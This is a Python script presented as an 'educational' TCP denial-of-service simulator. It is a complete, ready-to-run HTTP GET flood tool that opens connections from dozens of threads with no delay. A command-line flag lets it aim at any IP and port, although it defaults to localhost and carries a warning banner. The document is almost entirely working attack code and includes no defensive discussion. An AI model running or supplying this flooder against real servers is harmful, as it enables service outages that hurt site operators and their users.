import socket
import threading
import time
import argparse

class DoSSimulator:
    def __init__(self):
        self.running = False
        self.threads = []

    def send_packets(self, target_ip, target_port, num_packets, delay, thread_id):
        """Worker thread function to flood HTTP GET requests"""
        for i in range(num_packets):
            if not self.running:
                break
            try:
                # TCP socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, target_port))

                # Raw GET request
                request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: close\r\n\r\n"
                s.sendall(request.encode())

                s.close()

                if i % 100 == 0:
                    print(f"Thread {thread_id}: Sent {i+1}/{num_packets} packets")

                if delay > 0:
                    time.sleep(delay)
            except Exception as e:
                continue  # Don't print to keep it fast

    def start_attack(self, target_ip, target_port, num_packets, delay, num_threads):
        """Start the DoS simulation with multiple threads"""
        self.running = True
        packets_per_thread = num_packets // num_threads

        print(f"🚀 Starting high-speed TCP DoS attack on {target_ip}:{target_port}")
        print(f"💥 Threads: {num_threads} | Packets/thread: {packets_per_thread} | Delay: {delay}s\n")

        for i in range(num_threads):
            thread = threading.Thread(
                target=self.send_packets,
                args=(target_ip, target_port, packets_per_thread, delay, i)
            )
            self.threads.append(thread)
            thread.start()

        for thread in self.threads:
            thread.join()

        print("\n✅ Attack completed.")

    def stop_attack(self):
        """Stop the attack"""
        self.running = False
        print("Attack stopped.")

def main():
    print("""
    ===========================================
     ⚠️ Educational TCP DoS Simulator
     Use only in isolated environments!
    ===========================================
    """)

    parser = argparse.ArgumentParser(description='High-speed TCP DoS tool')
    parser.add_argument('--target-ip', help='Target IP address', default='127.0.0.1')
    parser.add_argument('--target-port', type=int, help='Target port', default=8080)
    parser.add_argument('--packets', type=int, help='Total packets to send', default=10000)
    parser.add_argument('--delay', type=float, help='Delay between packets (seconds)', default=0)
    parser.add_argument('--threads', type=int, help='Number of threads', default=50)

    args = parser.parse_args()

    simulator = DoSSimulator()

    try:
        simulator.start_attack(
            args.target_ip,
            args.target_port,
            args.packets,
            args.delay,
            args.threads
        )
    except KeyboardInterrupt:
        simulator.stop_attack()

if __name__ == "__main__":
    main()
